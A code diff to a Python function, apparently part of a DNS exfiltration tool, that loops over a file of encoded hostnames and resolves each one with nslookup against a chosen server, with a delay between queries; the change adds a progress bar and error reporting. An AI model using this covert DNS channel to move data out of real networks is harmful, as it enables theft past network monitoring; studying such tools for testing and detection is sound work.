@@ -92,20 +92,44 @@ def TransferCloakedFile( cloakedFile, queryDelay, dns ):
 #========================================================================
 
 def GenerateDNSQueries(cloakedFile, queryDelay, dns='localhost'):
-    tmpAddrStr = ""
-    byteCount = 0
-    
-    with open(cloakedFile, 'r') as fqdnFile:
-        #print("Progress (bytes transmitted - patience is a virtue): ")
-        for fqdn in fqdnFile:
-            fqdnStr = fqdn.strip()
-            # We don't care if the lookup fails, so carry on
-            try:
-                ret = subprocess.run(['nslookup', fqdnStr, dns], stdout=os.devnull, stderr=os.devnull)
-                time.sleep(queryDelay)
-            except:
-                time.sleep(queryDelay)
-    return
+    try:
+        # Get number of lines in the file for progress bar calculation
+        with open(cloakedFile, 'r') as fqdnFile:
+            num_lines = sum(1 for _ in fqdnFile)
+
+            # Reset file pointer for proper iteration
+            fqdnFile.seek(0)
+
+        # Initialize progress bar variables
+        progress = 0
+        bar_length = 50  # Adjust this for desired bar length
+        print("Progress:")
+
+        with open(cloakedFile, 'r') as fqdnFile:
+            for fqdn in fqdnFile:
+                fqdnStr = fqdn.strip()
+
+                # Handle potential errors during DNS lookup
+                try:
+                    subprocess.run(['nslookup', fqdnStr, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    time.sleep(queryDelay)
+                except Exception as e:
+                    print(f"Error encountered for FQDN: {fqdnStr} - {e}")
+
+                # Update progress bar
+                progress += 1
+                percent = int((progress / num_lines) * 100)
+                filled_length = int(percent / 100 * bar_length)
+
+                print('[' + ('#' * filled_length) + (' ' * (bar_length - filled_length)) + ']', end='\r')
+                if percent == 100:
+                    print(' (Done)')  # Add newline after completion
+
+    except FileNotFoundError as e:
+        print(f"Error: File not found - {e}")
+
+    except Exception as e:
+        print(f"Unexpected error: {e}")
 
 
 
